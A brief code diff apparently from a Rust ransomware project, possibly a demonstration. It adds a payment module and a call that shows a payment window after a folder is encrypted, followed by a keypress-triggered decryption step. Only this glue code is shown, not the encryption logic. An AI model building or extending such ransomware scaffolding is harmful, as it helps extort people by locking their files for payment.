@@ -1,4 +1,6 @@
 mod cryptography;
+mod payment;
+use cryptography::encrypt::{ generate_key, encrypt_file, decrypt_file };
 mod ransomware;
 
 use ransomware::fileEncrypt::FileEncryptor;
@@ -15,6 +17,7 @@ fn main() -> anyhow::Result<()> {
     encryptor.encrypt_folder(folder_path)?;
     
     println!("Encryption complete! Files are now encrypted.");
+    payment::show_payment_window();
     println!("Press Enter to proceed to decryption...");
     let mut input = String::new();
     io::stdin().read_line(&mut input)?;
